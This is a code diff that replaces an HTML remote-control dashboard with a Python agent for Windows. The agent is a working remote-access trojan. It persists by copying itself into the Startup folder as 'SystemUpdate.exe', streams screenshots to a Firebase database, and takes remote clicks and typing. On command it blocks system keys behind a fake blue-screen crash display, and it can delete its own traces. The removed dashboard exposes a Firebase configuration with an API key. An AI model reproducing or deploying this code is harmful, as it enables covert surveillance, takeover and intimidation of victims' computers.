@@ -1,217 +1,224 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced System Control</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
-        body { font-family: 'Space Grotesk', sans-serif; background: #020617; overflow-x: hidden; }
-        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
+import firebase_admin
+from firebase_admin import credentials, db
+import tkinter as tk
+import threading
+import time
+import queue
+import keyboard
+import pyautogui
+import base64
+import os
+import sys
+import shutil
+import subprocess
+import uuid
+from io import BytesIO
+
+# --- Configuration & Identity ---
+def get_device_id():
+    """Har computer ke liye unique ID generate karein motherboard/node ke base par"""
+    return str(uuid.getnode())
+
+DEVICE_ID = get_device_id()
+APP_PATH = os.path.realpath(sys.argv[0])
+
+# Firebase Initialization
+try:
+    cred = credentials.Certificate('serviceAccountKey.json')
+    firebase_admin.initialize_app(cred, {
+        'databaseURL': 'https://smsyy-f7bb7-default-rtdb.firebaseio.com'
+    })
+    print(f"Device ID: {DEVICE_ID} - Remote Controller Started...")
+except Exception as e:
+    print(f"Firebase Error: {e}")
+    exit()
+
+class RemoteLocker:
+    def __init__(self):
+        self.root = None
+        self.is_locked = False
+        self.is_streaming = False
+        self.cmd_queue = queue.Queue()
+        self.screen_width, self.screen_height = pyautogui.size()
+        self.blocked_keys = ['windows', 'alt', 'tab', 'esc', 'ctrl', 'delete', 'f4']
+        self.start_time = 0
+        self.lock_duration = 600 # 10 minutes progress for BSOD
         
-        /* Custom Hand Cursor for the Viewport */
-        #live-img { 
-            cursor: url('https://cur.cursors-4u.net/symbols/sym-1/sym46.cur'), pointer;
-            user-drag: none; 
-            -webkit-user-drag: none; 
-        }
+        # Paths for Persistence (Startup)
+        self.startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+        self.target_exe = os.path.join(self.startup_folder, "SystemUpdate.exe")
 
-        /* Click Ripple Effect */
-        .click-ripple {
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            background: rgba(59, 130, 246, 0.5);
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            animation: ripple 0.6s linear;
-        }
+    def _add_to_startup(self):
+        """Khud ko startup folder mein copy karein (exe version compatible)"""
+        try:
+            if not os.path.exists(self.target_exe):
+                shutil.copy2(APP_PATH, self.target_exe)
+        except:
+            pass
 
-        @keyframes ripple {
-            from { transform: translate(-50%, -50%) scale(0); opacity: 1; }
-            to { transform: translate(-50%, -50%) scale(4); opacity: 0; }
-        }
-    </style>
-</head>
-<body class="min-h-screen text-slate-200 p-4 md:p-8">
+    def _ping_status(self):
+        """Dashboard par live presence aur hostname bhejte rahein"""
+        while True:
+            try:
+                db.reference(f'devices/{DEVICE_ID}/status').set({
+                    'last_seen': time.time(),
+                    'online': True,
+                    'hostname': os.getenv('COMPUTERNAME', 'Unknown-PC')
+                })
+            except: pass
+            time.sleep(5)
 
-    <div class="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-6">
+    def _self_destruct(self):
+        """Agent ko system se poori tarah delete karke exit karein"""
+        try:
+            if os.path.exists(self.target_exe):
+                os.remove(self.target_exe)
+            
+            # Script ko delete karne ke liye temporary batch file
+            batch_path = os.path.join(os.getenv('TEMP'), "cleanup.bat")
+            with open(batch_path, "w") as f:
+                f.write(f'timeout /t 3 /nobreak > nul\ndel /f /q "{APP_PATH}"\ndel "%~f0"')
+            
+            subprocess.Popen(batch_path, shell=True)
+            os._exit(0)
+        except:
+            os._exit(0)
+
+    def _capture_screen_optimized(self):
+        """Zero flicker screen capture strategy"""
+        try:
+            if not self.root: return
+            if self.is_locked:
+                # Topmost ko momentarily disable karke capture karein
+                self.root.attributes("-topmost", False)
+                self.root.lower()
+                time.sleep(0.01)
+            
+            screenshot = pyautogui.screenshot()
+            
+            if self.is_locked:
+                self.root.attributes("-topmost", True)
+                self.root.lift()
+            
+            buffered = BytesIO()
+            screenshot.save(buffered, format="JPEG", quality=30)
+            img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
+            db.reference(f'devices/{DEVICE_ID}/last_screenshot').set(f"data:image/jpeg;base64,{img_str}")
+        except Exception as e:
+            print(f"Capture Error: {e}")
+
+    def _stream_loop(self):
+        while True:
+            if self.is_streaming:
+                self._capture_screen_optimized()
+            time.sleep(1.5)
+
+    def process_queue(self):
+        try:
+            while True:
+                msg = self.cmd_queue.get_nowait()
+                m_type = msg.get('type')
+                
+                if m_type == 'lock':
+                    if msg['val']: self._show_bsod()
+                    else: self._hide_bsod()
+                elif m_type == 'stream':
+                    self.is_streaming = msg['val']
+                elif m_type == 'mouse':
+                    tx, ty = int(msg['x'] * self.screen_width), int(msg['y'] * self.screen_height)
+                    if self.is_locked:
+                        self.root.attributes("-alpha", 0.0)
+                        pyautogui.click(tx, ty)
+                        self.root.attributes("-alpha", 1.0)
+                    else:
+                        pyautogui.click(tx, ty)
+                elif m_type == 'type_text':
+                    text = msg['text']
+                    if text and text.startswith("{KEY:"):
+                        key = text.replace("{KEY:", "").replace("}", "").lower()
+                        pyautogui.press(key)
+                    elif text:
+                        pyautogui.write(text, interval=0.01)
+                elif m_type == 'destruct':
+                    self._self_destruct()
+        except queue.Empty:
+            pass
         
-        <!-- Controls Sidebar -->
-        <div class="lg:col-span-3 space-y-6">
-            <div class="glass p-6 rounded-3xl shadow-2xl border-t-2 border-blue-500">
-                <h1 class="text-xl font-bold mb-6 tracking-tighter">REMOTE TERMINAL</h1>
-                
-                <!-- Status -->
-                <div class="mb-6 p-3 rounded-xl bg-black/40 border border-white/5">
-                    <div class="flex items-center gap-2">
-                        <div id="status-dot" class="w-2 h-2 rounded-full bg-slate-600"></div>
-                        <span id="status-text" class="text-xs font-mono uppercase">Syncing...</span>
-                    </div>
-                </div>
+        if self.is_locked: self._update_progress()
+        if self.root: self.root.after(30, self.process_queue)
 
-                <!-- Command Buttons -->
-                <div class="space-y-2 mb-6">
-                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1 text-center">System State</p>
-                    <button onclick="setDb('overlay_active', true)" id="lock-btn" class="w-full py-3 bg-red-600 hover:bg-red-700 rounded-lg font-bold text-sm transition-all active:scale-95">LOCK SYSTEM</button>
-                    <button onclick="setDb('overlay_active', false)" class="w-full py-3 bg-slate-800 hover:bg-slate-700 rounded-lg text-sm text-slate-400 transition-all active:scale-95">BYPASS</button>
-                </div>
+    def _update_progress(self):
+        elapsed = time.time() - self.start_time
+        percent = int((elapsed / self.lock_duration) * 100)
+        if percent > 100: percent = 100
+        if hasattr(self, 'perc_label'):
+            self.perc_label.config(text=f"{percent}% complete")
 
-                <div class="space-y-2 mb-6">
-                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1 text-center">Surveillance</p>
-                    <div class="flex gap-2">
-                        <button onclick="setDb('stream_active', true)" id="start-stream-btn" class="flex-1 py-3 bg-emerald-600 hover:bg-emerald-700 rounded-lg text-xs font-bold transition-all active:scale-95">START LIVE</button>
-                        <button onclick="setDb('stream_active', false)" id="stop-stream-btn" class="flex-1 py-3 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs transition-all active:scale-95">STOP</button>
-                    </div>
-                </div>
+    def _show_bsod(self):
+        if self.is_locked: return
+        self.is_locked = True
+        self.start_time = time.time()
+        for key in self.blocked_keys:
+            try: keyboard.block_key(key)
+            except: pass
+        
+        self.root.deiconify()
+        self.root.attributes("-fullscreen", True, "-topmost", True, "-alpha", 1.0)
+        bsod_color = '#0078D7'
+        self.root.configure(background=bsod_color)
+        self.root.overrideredirect(True)
+        
+        for widget in self.root.winfo_children(): widget.destroy()
+        
+        # Real Windows 11 BSOD Layout
+        f = tk.Frame(self.root, bg=bsod_color)
+        f.place(relx=0.1, rely=0.15, relwidth=0.8, relheight=0.7)
+        
+        tk.Label(f, text=":(", fg="white", bg=bsod_color, font=("Segoe UI Light", 120)).pack(anchor='w', pady=(0, 10))
+        msg = "Your PC ran into a problem and needs to restart. We're just\ncollecting some error info, and then we'll restart for you."
+        tk.Label(f, text=msg, fg="white", bg=bsod_color, font=("Segoe UI", 26), justify="left").pack(anchor='w', pady=(0, 15))
+        
+        self.perc_label = tk.Label(f, text="0% complete", fg="white", bg=bsod_color, font=("Segoe UI", 26))
+        self.perc_label.pack(anchor='w', pady=(0, 40))
+        
+        footer = tk.Frame(f, bg=bsod_color)
+        footer.pack(anchor='w', side="bottom", pady=20)
+        
+        tk.Label(footer, text="For more information about this issue and possible fixes, visit https://www.windows.com/stopcode", 
+                 fg="white", bg=bsod_color, font=("Segoe UI", 12)).pack(anchor='w')
+        tk.Label(footer, text="If you call a support person, give them this info:", fg="white", bg=bsod_color, font=("Segoe UI", 12)).pack(anchor='w', pady=(10,0))
+        tk.Label(footer, text="Stop code: CRITICAL_PROCESS_DIED", fg="white", bg=bsod_color, font=("Segoe UI", 12, "bold")).pack(anchor='w')
 
-                <!-- Typing Control -->
-                <div class="space-y-2">
-                    <p class="text-[10px] text-slate-500 uppercase font-bold px-1 text-center">Remote Input</p>
-                    <div class="flex flex-col gap-2">
-                        <input type="text" id="type-input" placeholder="Type here..." class="w-full bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-xs focus:outline-none focus:border-blue-500 text-white">
-                        <div class="flex gap-2">
-                            <button onclick="sendText()" class="flex-1 bg-blue-600 hover:bg-blue-700 py-2 rounded-lg text-xs font-bold uppercase transition-all active:scale-95">Send</button>
-                            <button onclick="sendSpecialKey('enter')" class="flex-1 bg-slate-700 hover:bg-slate-600 py-2 rounded-lg text-xs font-bold uppercase transition-all active:scale-95 flex items-center justify-center gap-1">
-                                Enter ↵
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+        self.root.config(cursor="none")
+        self.root.focus_force()
 
-        <!-- Viewport -->
-        <div class="lg:col-span-9">
-            <div class="glass p-4 rounded-3xl h-full flex flex-col min-h-[600px]">
-                <div class="flex items-center justify-between mb-3 px-2">
-                    <div class="flex items-center gap-3">
-                        <div id="live-indicator" class="w-2 h-2 rounded-full bg-red-500 animate-pulse hidden"></div>
-                        <span class="text-[10px] font-bold tracking-widest uppercase opacity-50">Live Viewport (Precise Control Mode)</span>
-                    </div>
-                    <span id="timestamp" class="text-[10px] font-mono opacity-40">--:--:--</span>
-                </div>
-                
-                <div id="viewport-container" class="relative flex-1 bg-black rounded-2xl overflow-hidden border border-white/10 group flex items-center justify-center">
-                    <!-- Live Image Display -->
-                    <img id="live-img" class="max-w-full max-h-full object-contain hidden pointer-events-auto" src="" onmousedown="remoteClick(event)" draggable="false" />
-                    
-                    <!-- Loader / Placeholder -->
-                    <div id="loader" class="absolute inset-0 flex flex-col items-center justify-center text-slate-700">
-                        <div class="w-8 h-8 border-2 border-slate-800 border-t-blue-500 rounded-full animate-spin mb-4"></div>
-                        <p class="text-[9px] uppercase tracking-widest">Awaiting Link...</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+    def _hide_bsod(self):
+        if not self.is_locked: return
+        self.is_locked = False
+        keyboard.unhook_all()
+        self.root.withdraw()
+        self.root.config(cursor="")
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
-            authDomain: "smsyy-f7bb7.firebaseapp.com",
-            databaseURL: "https://smsyy-f7bb7-default-rtdb.firebaseio.com",
-            projectId: "smsyy-f7bb7",
-            storageBucket: "smsyy-f7bb7.firebasestorage.app",
-            messagingSenderId: "199149027655",
-            appId: "1:199149027655:web:2d9e70e7dff7abc293cc62"
-        };
+    def start(self):
+        self._add_to_startup()
+        self.root = tk.Tk()
+        self.root.withdraw()
+        threading.Thread(target=self._stream_loop, daemon=True).start()
+        threading.Thread(target=self._ping_status, daemon=True).start()
+        self.process_queue()
+        self.root.mainloop()
 
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+# Listeners for specific DeviceID path
+locker = RemoteLocker()
+device_ref = db.reference(f'devices/{DEVICE_ID}/commands')
 
-        function setDb(path, val) { 
-            database.ref('system_settings/' + path).set(val); 
-        }
+def setup_listeners():
+    device_ref.child('lock').on_value(lambda e: locker.cmd_queue.put({'type': 'lock', 'val': e.data}) if e.data is not None else None)
+    device_ref.child('stream').on_value(lambda e: locker.cmd_queue.put({'type': 'stream', 'val': e.data}) if e.data is not None else None)
+    device_ref.child('mouse').on_value(lambda e: locker.cmd_queue.put({'type': 'mouse', 'x': e.data['x'], 'y': e.data['y']}) if e.data else None)
+    device_ref.child('typing').on_value(lambda e: locker.cmd_queue.put({'type': 'type_text', 'text': e.data}) if e.data else None)
+    device_ref.child('destruct').on_value(lambda e: locker.cmd_queue.put({'type': 'destruct'}) if e.data is True else None)
 
-        // Remote Clicking Logic
-        function remoteClick(e) {
-            const img = document.getElementById('live-img');
-            const rect = img.getBoundingClientRect();
-            
-            // Calculate coordinates relative to the image
-            const x = (e.clientX - rect.left) / rect.width;
-            const y = (e.clientY - rect.top) / rect.height;
-            
-            if (x >= 0 && x <= 1 && y >= 0 && y <= 1) {
-                // Show Ripple
-                const ripple = document.createElement('div');
-                ripple.className = 'click-ripple';
-                ripple.style.left = `${e.clientX - rect.left}px`;
-                ripple.style.top = `${e.clientY - rect.top}px`;
-                document.getElementById('viewport-container').appendChild(ripple);
-                setTimeout(() => ripple.remove(), 600);
-
-                // Send to Firebase
-                database.ref('system_settings/mouse_click').set({
-                    x: x,
-                    y: y,
-                    ts: Date.now()
-                });
-            }
-        }
-
-        function sendText() {
-            const input = document.getElementById('type-input');
-            const text = input.value;
-            if(text) {
-                database.ref('system_settings/remote_typing').set(text);
-                input.value = "";
-                setTimeout(() => { database.ref('system_settings/remote_typing').set(""); }, 500);
-            }
-        }
-
-        function sendSpecialKey(key) {
-            database.ref('system_settings/remote_typing').set(`{KEY:${key.toUpperCase()}}`);
-            setTimeout(() => { database.ref('system_settings/remote_typing').set(""); }, 500);
-        }
-
-        document.getElementById('type-input').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendText();
-        });
-
-        // Status Listener
-        database.ref('system_settings/overlay_active').on('value', (s) => {
-            const active = s.val();
-            const dot = document.getElementById('status-dot');
-            const txt = document.getElementById('status-text');
-            const btn = document.getElementById('lock-btn');
-            
-            if(active) {
-                txt.innerText = "SYSTEM LOCKED";
-                txt.className = "text-xs font-mono uppercase text-red-500 font-bold";
-                dot.className = "w-2 h-2 rounded-full bg-red-500 animate-pulse";
-                btn.innerText = "LOCKED";
-                btn.classList.replace('bg-red-600', 'bg-red-900');
-            } else {
-                txt.innerText = "ONLINE / READY";
-                txt.className = "text-xs font-mono uppercase text-emerald-500";
-                dot.className = "w-2 h-2 rounded-full bg-emerald-500";
-                btn.innerText = "LOCK SYSTEM";
-                btn.classList.replace('bg-red-900', 'bg-red-600');
-            }
-        });
-
-        database.ref('system_settings/stream_active').on('value', (s) => {
-            const isStreaming = s.val();
-            document.getElementById('live-indicator').classList.toggle('hidden', !isStreaming);
-        });
-
-        database.ref('system_settings/last_screenshot').on('value', (s) => {
-            const b64 = s.val();
-            const img = document.getElementById('live-img');
-            const loader = document.getElementById('loader');
-            if(b64) {
-                img.src = b64;
-                img.classList.remove('hidden');
-                loader.classList.add('hidden');
-                document.getElementById('timestamp').innerText = "LIVE | " + new Date().toLocaleTimeString();
-            }
-        });
-    </script>
-</body>
-</html>
+if __name__ == "__main__":
+    setup_listeners()
+    locker.start()
